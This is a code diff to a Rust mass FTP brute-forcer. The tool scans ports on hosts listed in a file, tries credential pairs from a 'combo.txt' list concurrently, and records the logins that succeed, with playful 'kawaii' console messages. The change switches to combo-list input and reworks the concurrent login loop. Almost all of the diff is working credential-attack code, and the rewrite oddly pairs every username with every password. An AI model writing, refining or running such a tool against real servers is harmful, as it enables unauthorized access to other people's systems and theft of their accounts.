@@ -9,7 +9,7 @@ use std::{
 use tokio::{sync::{Semaphore, Mutex}, time::{sleep, Duration}};
 use tokio::time::timeout;
 use futures::stream::{FuturesUnordered, StreamExt};
-
+use futures::stream;
 
 // === Config ===
 const MAX_PORT_SCAN_CONCURRENCY: usize = 5; // ← New: limit parallel port scans
@@ -22,8 +22,7 @@ const OUTPUT_FILE: &str = "ftp_results.txt";
 
 // hardcoded input files
 const IP_LIST_FILE: &str = "ips.txt";
-const USERNAME_FILE: &str = "usernames.txt";
-const PASSWORD_FILE: &str = "passwords.txt";
+const USERPASS_FILE: &str = "combo.txt";
 
 // === Colors for Ultimate Kawaii Experience ===
 const PURPLE: &str = "\x1b[38;5;135m"; // Purple 💜
@@ -52,9 +51,9 @@ fn format_addr(target: &str, port: u16) -> String {
         };
         if clean.contains(':') {
             format!("[{}]:{}", clean, port)
-        } else {
-            format!("{}:{}", clean, port)
-        }
+       } else {
+    format!("{}:{}", clean, port)
+}
     }
 }
 
@@ -108,8 +107,20 @@ pub async fn run(_target: &str) -> Result<()> {
     println!("{PURPLE}~(>w<)~ Initiating super kawaii scanning sequence~ {RESET}");
 
 
-    let users = load_lines(USERNAME_FILE)?;
-    let passes = load_lines(PASSWORD_FILE)?;
+let combos = load_lines(USERPASS_FILE)?;
+let mut usernames_vec = Vec::new();
+let mut passwords_vec = Vec::new();
+
+for combo in combos {
+    if let Some((user, pass)) = combo.split_once(':') {
+        usernames_vec.push(user.to_string());
+        passwords_vec.push(pass.to_string());
+    }
+}
+
+let usernames = Arc::new(usernames_vec);
+let passwords = Arc::new(passwords_vec);
+
     let found = Arc::new(Mutex::new(Vec::new()));
     let semaphore = Arc::new(Semaphore::new(GLOBAL_CONCURRENCY));
 
@@ -128,13 +139,13 @@ println!("{ORANGE}[*] Starting scan of cute servers... nyaa~~ {RESET}");
             continue;
         }
 
-        let users = users.clone();
-        let passes = passes.clone();
-        let found = Arc::clone(&found);
-        let sem = Arc::clone(&semaphore);
+let usernames = Arc::clone(&usernames);
+let passwords = Arc::clone(&passwords);
+let found = Arc::clone(&found);
+let sem = Arc::clone(&semaphore);
+
 
         all_tasks.push(tokio::spawn(async move {
-            // === Scan ports first ===
             let open_ports = {
                 let mut scan_tasks = FuturesUnordered::new();
                 let port_scan_sem = Arc::new(Semaphore::new(MAX_PORT_SCAN_CONCURRENCY));
@@ -172,46 +183,48 @@ println!("{ORANGE}[*] Starting scan of cute servers... nyaa~~ {RESET}");
     let addr = format_addr(&ip, port);
     println!("{PURPLE}[*] Brute-forcing {} nya~ (ง •̀_•́)ง {RESET}", addr);
 
-    let successes = Arc::new(Mutex::new(Vec::new()));
-    let stop_flag = Arc::new(Mutex::new(false));
-    let mut tasks = FuturesUnordered::new();
+                let successes = Arc::new(Mutex::new(Vec::new()));
+                let stop_flag = Arc::new(Mutex::new(false));
 
-    for user in &users {
-        for pass in &passes {
-            let addr = addr.clone();
-            let user = user.clone();
-            let pass = pass.clone();
-            let successes = Arc::clone(&successes);
-            let stop_flag = Arc::clone(&stop_flag);
-            let sem = Arc::clone(&sem);
+let userpass_stream = stream::iter({
+    let mut combos = Vec::new();
+    for user in usernames.iter() {
+        for pass in passwords.iter() {
+            combos.push((user.clone(), pass.clone()));
+        }
+    }
+    combos
+})
+.map(|(user, pass)| {  // <-- (user, pass) directly here!
+    let addr = addr.clone();
+    let successes = Arc::clone(&successes);
+    let stop_flag = Arc::clone(&stop_flag);
+    let sem = Arc::clone(&sem);
 
-            tasks.push(tokio::spawn(async move {
-                let _permit = sem.acquire_owned().await.unwrap();
+    async move {
+        let _permit = sem.acquire_owned().await.unwrap();
 
-                if STOP_ON_SUCCESS && *stop_flag.lock().await {
-                    return;
+        if STOP_ON_SUCCESS && *stop_flag.lock().await {
+            return;
+        }
+
+                                 match try_ftp_login(&addr, &user, &pass).await {
+            Ok(true) => {
+                println!("{PINK}[+] Sugoiii! {} -> {}:{} ~ 💖{RESET}", addr, user, pass);
+                successes.lock().await.push((addr.clone(), user.clone(), pass.clone()));
+                if STOP_ON_SUCCESS {
+                    *stop_flag.lock().await = true;
                 }
-
-                                           match try_ftp_login(&addr, &user, &pass).await {
-                                Ok(true) => {
-                                    println!("{PINK}[+] Sugoiii! {} -> {}:{} ~ 💖{RESET}", addr, user, pass);
-                                    successes.lock().await.push((addr.clone(), user.clone(), pass.clone()));
-                                    if STOP_ON_SUCCESS {
-                                        *stop_flag.lock().await = true;
-                                    }
-                                }
-                                Ok(false) => {
-                                    println!("{ORANGE}[-] No luck on {} -> {}:{} ... (´；ω；`) {RESET}", addr, user, pass);
-                                }
-                                Err(_) => {}
-                            }
-                        }));
-                    }
-                }
-
-    while let Some(res) = tasks.next().await {
-                    res.ok(); // Ignore individual errors
-                }
+            }
+            Ok(false) => {
+                println!("{ORANGE}[-] No luck on {} -> {}:{} ... (´；ω；`) {RESET}", addr, user, pass);
+            }
+            Err(_) => {}
+        }
+    }
+})
+.buffer_unordered(GLOBAL_CONCURRENCY);
+                userpass_stream.for_each(|_| async {}).await;
 
                 let successes_vec = successes.lock().await;
                 if successes_vec.is_empty() {
